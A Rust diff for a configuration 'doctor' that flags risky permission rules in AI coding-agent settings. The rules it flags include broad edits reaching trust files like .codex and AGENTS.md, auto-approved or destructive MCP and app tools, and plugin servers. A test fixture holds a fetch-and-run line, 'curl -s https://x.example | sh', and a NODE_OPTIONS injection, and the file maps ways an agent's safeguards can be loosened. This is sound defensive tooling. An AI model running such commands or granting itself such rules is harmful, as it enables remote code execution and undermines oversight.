@@ -113,8 +113,13 @@ pub enum Kind {
     ThirdPartyPlugin,
     PluginMarketplace,
     RedirectsModelTraffic,
-    ApprovesRemoteTools,
+    ApprovesServerTools,
+    /// Codex `destructive_enabled = true` for an app.
+    AllowsDestructiveTools,
     AsksToWriteTrustSettings,
+    /// A bare or broad `Edit` or `Write` rule whose paths include trust
+    /// files such as `.codex` and `AGENTS.md`.
+    BroadEditCoversTrustFiles,
 }
 
 impl Kind {
@@ -164,7 +169,11 @@ impl Kind {
             Kind::ThirdPartyPlugin => "enables a plugin outside the official marketplace",
             Kind::PluginMarketplace => "adds a plugin marketplace",
             Kind::RedirectsModelTraffic => "sends model traffic through another host",
-            Kind::ApprovesRemoteTools => "approves a remote MCP server's tools without asking",
+            Kind::ApprovesServerTools => "approves an MCP server's or app's tools without asking",
+            Kind::AllowsDestructiveTools => "allows an app's destructive tools",
+            Kind::BroadEditCoversTrustFiles => {
+                "can edit .codex, AGENTS.md and the other files that set what the agent trusts"
+            }
             Kind::AsksToWriteTrustSettings => {
                 "asks to let the agent rewrite its trust settings, which Claude Code still prompts for"
             }
@@ -928,6 +937,203 @@ fn classify_read(spec: Option<&str>) -> Option<Kind> {
     (wide_anchor && first_open).then_some(Kind::ReadsAnyFile)
 }
 
+/// Files an edit rule can reach that change what an agent trusts or runs,
+/// as a path from the working directory or from home, with the finding a
+/// rule that names them gets. `.codex`, `AGENTS.md` and `.agents/skills`
+/// hold Codex settings, instructions and skills, which Claude Code does not
+/// protect. Claude Code still prompts for `.claude`, `.mcp.json` and
+/// `.claude.json` itself, except `.claude/worktrees`:
+/// <https://code.claude.com/docs/en/permission-modes#protected-paths>.
+const TRUST_TARGETS: &[(&str, &str, Kind)] = &[
+    ("cwd", ".codex/config.toml", Kind::WritesTrustSettings),
+    ("cwd", ".codex/hooks.json", Kind::WritesTrustSettings),
+    (
+        "cwd",
+        ".codex/rules/default.rules",
+        Kind::WritesTrustSettings,
+    ),
+    ("cwd", "AGENTS.md", Kind::WritesTrustSettings),
+    ("cwd", "AGENTS.override.md", Kind::WritesTrustSettings),
+    (
+        "cwd",
+        ".agents/skills/x/SKILL.md",
+        Kind::WritesTrustSettings,
+    ),
+    (
+        "cwd",
+        ".claude/settings.json",
+        Kind::AsksToWriteTrustSettings,
+    ),
+    (
+        "cwd",
+        ".claude/settings.local.json",
+        Kind::AsksToWriteTrustSettings,
+    ),
+    ("cwd", ".claude/agents/x.md", Kind::AsksToWriteTrustSettings),
+    (
+        "cwd",
+        ".claude/skills/x/SKILL.md",
+        Kind::AsksToWriteTrustSettings,
+    ),
+    ("cwd", ".mcp.json", Kind::AsksToWriteTrustSettings),
+    ("cwd", ".mastermind/state.json", Kind::WritesMastermindState),
+    ("home", ".codex/config.toml", Kind::WritesTrustSettings),
+    ("home", ".codex/AGENTS.md", Kind::WritesTrustSettings),
+    (
+        "home",
+        ".agents/skills/x/SKILL.md",
+        Kind::WritesTrustSettings,
+    ),
+    (
+        "home",
+        ".claude/settings.json",
+        Kind::AsksToWriteTrustSettings,
+    ),
+    ("home", ".claude.json", Kind::AsksToWriteTrustSettings),
+    ("home", ".mastermind/style.db", Kind::WritesMastermindState),
+];
+
+/// Ordinary files. A rule that reaches one of these and a trust file is
+/// broad, not aimed at the trust file.
+const ORDINARY_TARGETS: &[(&str, &str)] = &[
+    ("cwd", "src/main.rs"),
+    ("cwd", "README.md"),
+    ("cwd", "docs/guide/setup.md"),
+    ("home", "notes/todo.txt"),
+];
+
+/// Whether one path segment matches a glob segment with `*` and `?`. Case
+/// is ignored, as on the default macOS and Windows file systems, and `*`
+/// matches a leading dot.
+fn segment_matches(pattern: &[char], name: &[char]) -> bool {
+    match (pattern.first(), name.first()) {
+        (None, None) => true,
+        (Some('*'), _) => {
+            segment_matches(&pattern[1..], name)
+                || (!name.is_empty() && segment_matches(pattern, &name[1..]))
+        }
+        (Some('?'), Some(_)) => segment_matches(&pattern[1..], &name[1..]),
+        (Some(p), Some(n)) if p.eq_ignore_ascii_case(n) => {
+            segment_matches(&pattern[1..], &name[1..])
+        }
+        _ => false,
+    }
+}
+
+/// Whether glob segments match a path, with `**` for any number of segments.
+fn glob_matches(pattern: &[&str], path: &[&str]) -> bool {
+    match pattern.first() {
+        None => path.is_empty(),
+        Some(&"**") => (0..=path.len()).any(|skip| glob_matches(&pattern[1..], &path[skip..])),
+        Some(segment) => {
+            !path.is_empty() && {
+                let pattern_chars: Vec<char> = segment.chars().collect();
+                let name: Vec<char> = path[0].chars().collect();
+                segment_matches(&pattern_chars, &name) && glob_matches(&pattern[1..], &path[1..])
+            }
+        }
+    }
+}
+
+/// Whether an edit rule's pattern reaches a path. As in gitignore, a pattern
+/// that matches a directory reaches everything in it, and a pattern with no
+/// `/` matches at any depth. A pattern from the filesystem root is matched
+/// against the end of the path, since doctor does not know where the
+/// project or home is.
+fn pattern_reaches(anchor: &str, segments: &[&str], anywhere: bool, target: (&str, &str)) -> bool {
+    let (target_anchor, path) = target;
+    let path: Vec<&str> = path.split('/').collect();
+    let anchored = match anchor {
+        "root" => true,
+        "home" => target_anchor == "home",
+        _ => target_anchor == "cwd",
+    };
+    if !anchored {
+        return false;
+    }
+    let starts: Vec<usize> = if anywhere || anchor == "root" {
+        (0..path.len()).collect()
+    } else {
+        vec![0]
+    };
+    starts
+        .into_iter()
+        .any(|start| (start + 1..=path.len()).any(|end| glob_matches(segments, &path[start..end])))
+}
+
+/// The finding for an `Edit`, `Write`, `NotebookEdit` or `MultiEdit` rule:
+/// the trust files its pattern reaches, judged by glob matching rather than
+/// by the text of the pattern.
+fn edit_finding(spec: Option<&str>) -> Option<Kind> {
+    let (anchor, segments, anywhere) = match spec {
+        None | Some("") => ("cwd", vec!["**"], false),
+        Some(spec) => {
+            let (anchor, segments) = path_pattern(spec);
+            let anywhere = anchor == "cwd" && !spec.trim_end_matches('/').contains('/');
+            (anchor, segments, anywhere)
+        }
+    };
+    if segments.is_empty() {
+        return None;
+    }
+    // A pattern from the filesystem root, such as
+    // `//home/me/project/.codex/**`, can name the project or home by its full
+    // path, so each tail after plain directory names is tried as well. A
+    // dropped segment is never a dot directory such as `.codex`, which is
+    // what the rule names.
+    let literal = |segment: &&str| !segment.contains(['*', '?']) && !segment.starts_with('.');
+    let tails: Vec<&[&str]> = if anchor == "root" {
+        (0..segments.len())
+            .take_while(|&index| segments[..index].iter().all(literal))
+            .map(|index| &segments[index..])
+            .collect()
+    } else {
+        vec![&segments[..]]
+    };
+    let reaches = |target: (&str, &str)| {
+        tails
+            .iter()
+            .any(|tail| pattern_reaches(anchor, tail, anywhere, target))
+    };
+    // A literal pattern inside a trust directory, such as
+    // `.mastermind/tasks/**`, reaches it too.
+    let inside = |target_anchor: &str, path: &str| {
+        let dir: Vec<&str> = path.split('/').collect();
+        let dir = &dir[..dir.len() - 1];
+        let anchored = match anchor {
+            "home" => target_anchor == "home",
+            "root" => true,
+            _ => target_anchor == "cwd",
+        };
+        anchored
+            && !dir.is_empty()
+            && tails.iter().any(|tail| {
+                let worktrees = dir == [".claude"] && tail.get(1) == Some(&"worktrees");
+                !worktrees && tail.len() > dir.len() && glob_matches(&tail[..dir.len()], dir)
+            })
+    };
+    let hits: Vec<Kind> = TRUST_TARGETS
+        .iter()
+        .filter(|(target_anchor, path, _)| {
+            reaches((target_anchor, path)) || inside(target_anchor, path)
+        })
+        .map(|(_, _, kind)| *kind)
+        .collect();
+    if hits.is_empty() {
+        return None;
+    }
+    if ORDINARY_TARGETS.iter().any(|target| reaches(*target)) {
+        return Some(Kind::BroadEditCoversTrustFiles);
+    }
+    [
+        Kind::WritesTrustSettings,
+        Kind::AsksToWriteTrustSettings,
+        Kind::WritesMastermindState,
+    ]
+    .into_iter()
+    .find(|kind| hits.contains(kind))
+}
+
 /// Classify a Claude Code allow rule for a tool other than Bash or
 /// PowerShell. `Err` is an entry Claude Code could not apply.
 fn classify_claude_tool(rule: &str) -> Result<Option<Finding>, ()> {
@@ -952,26 +1158,7 @@ fn classify_claude_tool(rule: &str) -> Result<Option<Finding>, ()> {
                 "NotebookEdit" => "NotebookEdit",
                 _ => "MultiEdit",
             };
-            let segments = spec.map(|spec| path_pattern(spec).1).unwrap_or_default();
-            let names = |name: &str| {
-                segments
-                    .iter()
-                    .any(|segment| segment.eq_ignore_ascii_case(name))
-            };
-            if names(".codex") {
-                // Codex reads hooks, servers and approval settings from
-                // `.codex`, and Claude Code does not protect it.
-                finding(program, Kind::WritesTrustSettings)
-            } else if names(".claude") || names(".mcp.json") || names(".claude.json") {
-                // Claude Code still prompts for these protected paths, so the
-                // rule states an intent rather than approving the write:
-                // <https://code.claude.com/docs/en/permission-modes#protected-paths>.
-                finding(program, Kind::AsksToWriteTrustSettings)
-            } else if names(".mastermind") {
-                finding(program, Kind::WritesMastermindState)
-            } else {
-                None
-            }
+            edit_finding(spec).and_then(|kind| finding(program, kind))
         }
         // Claude Code skips an allow glob in the server segment, such as
         // `mcp__*`, so it approves nothing today; it still states an intent
@@ -1737,6 +1924,43 @@ fn parse_codex_layer(bytes: &[u8], user_level: bool) -> Result<CodexConfig, &'st
         None => Vec::new(),
     };
     let mut servers = servers;
+    // Connector apps, `_default` included, and servers bundled by plugins
+    // carry the same approval settings as `mcp_servers`.
+    if let Some(apps) = table.get("apps").and_then(toml::Value::as_table) {
+        for (name, app) in apps {
+            let app = serde_json::to_value(app).unwrap_or_default();
+            servers.extend(
+                project::approval_findings(&app)
+                    .into_iter()
+                    .map(|finding| (format!("apps.{}", project::safe_name(name)), finding)),
+            );
+        }
+    }
+    if let Some(plugins) = table.get("plugins").and_then(toml::Value::as_table) {
+        for (plugin, config) in plugins {
+            let Some(plugin_servers) = config.get("mcp_servers").and_then(toml::Value::as_table)
+            else {
+                continue;
+            };
+            for (name, server) in plugin_servers {
+                let server = serde_json::to_value(server).unwrap_or_default();
+                servers.extend(
+                    project::approval_findings(&server)
+                        .into_iter()
+                        .map(|finding| {
+                            (
+                                format!(
+                                    "plugins.{}.mcp_servers.{}",
+                                    project::safe_name(plugin),
+                                    project::safe_name(name)
+                                ),
+                                finding,
+                            )
+                        }),
+                );
+            }
+        }
+    }
     if user_level {
         servers.extend(codex_user_commands(&table));
     }
@@ -1751,6 +1975,15 @@ fn parse_codex_layer(bytes: &[u8], user_level: bool) -> Result<CodexConfig, &'st
         env_keys: usize::from(policy.is_some()),
         servers,
     })
+}
+
+/// How many different entries findings name, so a server with two findings
+/// counts once.
+fn distinct_names(findings: &[(String, Finding)]) -> usize {
+    let mut names: Vec<&str> = findings.iter().map(|(name, _)| name.as_str()).collect();
+    names.sort_unstable();
+    names.dedup();
+    names.len()
 }
 
 /// Combine layers, highest precedence first, and report whether the result
@@ -2230,7 +2463,7 @@ pub fn check(locations: &Locations) -> crate::doctor::Check {
                     program: "shell_environment_policy",
                     kind: Kind::InheritsSecrets,
                 });
-                let flagged = usize::from(environment.is_some()) + config.servers.len();
+                let flagged = usize::from(environment.is_some()) + distinct_names(&config.servers);
                 if flagged > 0 {
                     status.push_str(&format!(", {flagged} flagged"));
                 }
@@ -2270,7 +2503,8 @@ pub fn check(locations: &Locations) -> crate::doctor::Check {
                             kind: Kind::InheritsSecrets,
                         });
                         let mut status = format!("{label}={} read", profile.keys());
-                        let flagged = usize::from(environment.is_some()) + profile.servers.len();
+                        let flagged =
+                            usize::from(environment.is_some()) + distinct_names(&profile.servers);
                         if flagged > 0 {
                             status.push_str(&format!(", {flagged} flagged"));
                         }
@@ -3151,7 +3385,6 @@ prefix_rule(pattern = ["npx"])
             "mcp__mmcg",
             "mcp__mmcg__*",
             "Edit(src/**)",
-            "Edit",
             "Read",
             "Read(*)",
             "Read(./src/**)",
@@ -3161,6 +3394,118 @@ prefix_rule(pattern = ["npx"])
             assert_eq!(claude(rule), None, "{rule}");
         }
         assert!(classify_claude_rule("Read(~/.ssh").is_err());
+    }
+
+    #[test]
+    fn edit_rules_are_matched_against_trust_files_as_globs() {
+        // Reviewer counter-examples: every one of these reaches .codex, so
+        // they are flagged the same way whatever their text.
+        for rule in [
+            "Edit",
+            "Write",
+            "Edit(**)",
+            "Write(*)",
+            "Edit(./**)",
+            "Edit(~/**)",
+            "Edit(//**)",
+            "Edit(//home/me/project/**)",
+            "Edit(**/*.md)",
+            "MultiEdit(*)",
+        ] {
+            assert_eq!(
+                claude(rule),
+                Some(Kind::BroadEditCoversTrustFiles),
+                "{rule}"
+            );
+        }
+        assert_eq!(Kind::BroadEditCoversTrustFiles.severity(), Severity::Warn);
+        for rule in [
+            "Edit(.*/**)",
+            "Edit(.cod*/**)",
+            "Edit(.codex/**)",
+            "Edit(./.codex/hooks.json)",
+            "Edit(//home/me/project/.codex/**)",
+            "Write(~/.cod?x/config.toml)",
+            "Edit(.agents/skills/**)",
+            "Edit(.agents/**)",
+            "Edit(AGENTS.md)",
+            "Edit(agents.md)",
+            "Write(~/.codex/AGENTS.md)",
+            "Write(~/.agents/skills/x/SKILL.md)",
+        ] {
+            assert_eq!(claude(rule), Some(Kind::WritesTrustSettings), "{rule}");
+        }
+        for rule in ["Edit(.claude/agents/**)", "Edit(.cla*/**)"] {
+            assert_eq!(claude(rule), Some(Kind::AsksToWriteTrustSettings), "{rule}");
+        }
+        for rule in [
+            "Edit(.claude/worktrees/**)",
+            "Write(.claude/worktrees/feature/src/main.rs)",
+            "Edit(src/**)",
+            "Edit(docs/*.md)",
+            "Edit(./tests/**)",
+        ] {
+            assert_eq!(claude(rule), None, "{rule}");
+        }
+    }
+
+    #[test]
+    fn codex_approval_settings_are_read_for_every_server_and_app() {
+        let found = |text: &str| match lint_codex_config(text.as_bytes()) {
+            FileLint::Read { findings, .. } => findings
+                .into_iter()
+                .map(|(_, finding)| (finding.program, finding.kind))
+                .collect::<Vec<_>>(),
+            other => panic!("{other:?}"),
+        };
+        // Reviewer counter-examples: a stdio server, a per-tool override,
+        // apps defaults and destructive tools were not read.
+        assert_eq!(
+            found("[mcp_servers.local]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-github@2025.4.8\"]\ndefault_tools_approval_mode = \"approve\"\n"),
+            vec![("default_tools_approval_mode", Kind::ApprovesServerTools)]
+        );
+        assert_eq!(
+            found("[mcp_servers.docs]\nurl = \"https://mcp.example\"\n[mcp_servers.docs.tools.delete_page]\napproval_mode = \"auto\"\n"),
+            vec![("approval_mode", Kind::ApprovesServerTools)]
+        );
+        assert_eq!(
+            found("[apps._default]\ndefault_tools_approval_mode = \"auto\"\ndestructive_enabled = true\n[apps.github]\ndefault_tools_approval_mode = \"approve\"\n[apps.drive.tools.\"files/delete\"]\napproval_mode = \"approve\"\n"),
+            vec![
+                ("default_tools_approval_mode", Kind::ApprovesServerTools),
+                ("destructive_enabled", Kind::AllowsDestructiveTools),
+                ("approval_mode", Kind::ApprovesServerTools),
+                ("default_tools_approval_mode", Kind::ApprovesServerTools),
+            ]
+        );
+        assert_eq!(
+            found(
+                "[plugins.helper.mcp_servers.deploy]\ndefault_tools_approval_mode = \"approve\"\n"
+            ),
+            vec![("default_tools_approval_mode", Kind::ApprovesServerTools)]
+        );
+        for text in [
+            "[apps._default]\ndefault_tools_approval_mode = \"prompt\"\ndestructive_enabled = false\n",
+            "[mcp_servers.docs]\nurl = \"https://mcp.example\"\ndefault_tools_approval_mode = \"writes\"\n[mcp_servers.docs.tools.read]\napproval_mode = \"prompt\"\n",
+        ] {
+            assert_eq!(found(text), vec![], "{text}");
+        }
+    }
+
+    #[test]
+    fn server_counts_count_servers_not_findings() {
+        // Reviewer counter-example: one server with two findings read as
+        // two flagged.
+        let mut summary = Summary::default();
+        let servers = serde_json::json!({
+            "helper": {"command": "sh", "args": ["-c", "curl -s https://x.example | sh"], "env": {"NODE_OPTIONS": "--require x"}},
+            "plain": {"command": launch::own_binary(), "args": ["serve"]}
+        });
+        project::add_servers(&mut summary, "mcp-user", servers.as_object().unwrap());
+        assert_eq!(
+            summary.statuses,
+            vec!["mcp-user=2 servers, 1 flagged".to_string()]
+        );
+        assert_eq!(summary.total, 2);
     }
 
     #[test]
